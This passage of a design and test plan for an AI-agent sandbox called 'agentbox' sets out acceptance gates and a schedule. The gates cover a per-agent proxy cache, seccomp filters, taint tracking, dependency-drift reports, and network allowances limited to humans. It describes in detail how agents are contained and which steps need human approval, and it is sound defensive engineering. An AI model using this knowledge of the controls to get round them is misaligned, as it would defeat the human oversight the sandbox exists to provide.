- **A-G10 (weeks 7–8, caps and quota).** A task past `cache.task_fill_max_bytes` or `cache.task_fill_max_files` gets 404 on new misses, and so does an agent past `cache.agent_fill_day_bytes`; `go test` still passes over CONNECT. The store never passes `cache.agent_max_bytes`, and LRU keeps the newest entries. A direct write past the kernel limit as `agentbox-proxy` gets `EDQUOT`. Below `disk.reserve_bytes`, nothing fills.
- **A-G11 (weeks 7–8, private paths).** After `go.private.set{agent, corp.example/*}`, build a fixture that needs `corp.example/x`: no request naming `corp.example` reaches the filter, the proxy's cache path or its checksum client (proxy audit and the test upstream's log). A direct `/_cache/` request for `corp.example/x` gets 404 with no upstream request.
- **A-G12 (weeks 7–8, lifecycle).** `agent.remove` deletes `data/cache/<agent>`. `cache.purge{agent}` empties that agent's cache while another agent keeps its hits. Kill the proxy mid-fill: after restart there is no temp file, no orphan blob and no row without a blob. A fill whose task is revoked mid-download (slow mock upstream) inserts no row.
- **A-G13 (weeks 7–8, service filter).** For every non-root agentbox service, `/proc/<pid>/status` shows one more `Seccomp_filters` than the unit alone gives. Under that filter, `BTRFS_IOC_SUBVOL_CREATE` fails with `EOPNOTSUPP` as `agentbox-proxy` on `data/cache/<agent>`, as `agentbox-git` on `git/` and as `agentbox` on `state/`, also with `0xdead00000000` OR'd into cmd. Each service still passes its own gates. A nested subvolume made as root in `data/cache/<agent>` is reported by the next hourly sweep.
- **A-G14 (weeks 7–8, fuzz).** 24 h of fuzzing, no crash, every failure a 404: the filter's request parser and its `.info` reply parser, the proxy's `/_cache/` parser, `zip.CheckZip` plus `HashZip` on hostile zips, and checksum-database replies (lookup lines, tiles, notes).
- **A-G15 (weeks 9–10, deputy hosts).** A human-started `net.allow_domain{proxy.golang.org, 443}` and `{sum.golang.org, 443}` render the fixed DEPUTY HOST line before the typed host:port; the line stays byte-identical with control and bidi characters in the reason field. An agent-submitted `net.allow_domain{proxy.golang.org, 443}` returns `HUMAN_ONLY{deputy_host}` and creates no P. rootd refuses to load a `common.list` that names a deputy host. `net.allow_domain{registry.npmjs.org, 443}` renders no deputy line.
- **A-G16 (weeks 13–14, purge at the clear).** A tainted task fills 30 entries. `taint.clear` purges the cache before its INTENT: afterwards the store has 0 rows, 0 blobs and no checksum state, and every request from the next task is a miss. With the proxy unit stopped, rootd re-creates the empty store and the clear succeeds. With the proxy hung (SIGSTOP), the clear is refused with `CACHE_PURGE_FAILED` and the workspace stays tainted. Kill rootd between the purge and the INTENT: the cache is empty and the workspace is still tainted.
- **A-G17 (weeks 13–14, dependency report).** (a) A tainted task edits one vendored `.go` file and leaves `go.mod`, `go.sum` and `modules.txt` alone: the edit is the first high-risk item (drift), with its content diff, and the clear is refused until the typed count. (b) Bump a vendored module to a real newer version and alter one of its vendored files: high-risk. (c) Run `go mod vendor` after importing a new package from an already-required module: the new files verify against the cached zip and show as routine. (d) `npm install` adds 50 packages: each is a high-risk item with its file count, and one changed file in an unchanged package is drift. (e) Add 5000 pins with no installed code plus one new vendored module the main module imports: that module is the first item under new packages with installed code, and the 5000 are one routine count. (f) A truncated `package-lock.json`, a downgrade, a same-version hash change and a hashless pin are each high-risk. (g) Kill depcheck: every changed dependency file is high-risk, and the report says why. (h) Control and bidi characters in a package name leave the bound-field lines byte-identical. (i) 24 h of fuzzing the lockfile, go.sum, `modules.txt` and `RECORD` parsers, no crash.
- **A-G18 (weeks 13–14, attach dependency gate).** After routine churn (go.sum lines filled for required versions, pin upgrades with no installed code), attach needs no flag. After a high-risk item, attach is refused until `--ack-dependency-changes`; `--ack-control-changes` alone doesn't pass it. A planted `.mcp.json` still needs `--ack-control-changes`, even with `--ack-dependency-changes`.
- **A-G19 (weeks 15–16, taint neutrality).** Run the benchmark twice, cache on and cache off, with the env defaults on in both. Every task has the same taint outcome and the same asks. Report the median Go dependency time for both runs.

### 3.6 PLAN weeks

| Weeks (PLAN row) | Days | What lands |
|---|---|---|
| 5–6 | 0.75 | Go env from the allowlist and `go.private`; `GOTOOLCHAIN=local`; quiet npm and pip; `go.private.set`; Go in the image (mise, pinned, 3-day cooldown); lockfiles stay out of the control-path list. A-G1, A-G2. |
| 7–8 | 6.5 | Proxy cache (grammar, allowlist, taint first, fill and verify, caps, eviction, purge with fill cancel, integrity alerts); `data/cache/<agent>` at `agent.add`; taskrun filter (grammar, `task.taint_self`, live check); the service btrfs filter. A-G3–A-G14. Needs week 3 (auditd taint records, qgroups, rootd resolver), week 4 (gate) and weeks 5–6 (subvolumes, per-task sockets, taskrun). |
| 9–10 | 0.25 | DEPUTY HOST line, `HUMAN_ONLY{deputy_host}`, `agentbox egress allow`, the `common.list` check. A-G15. |
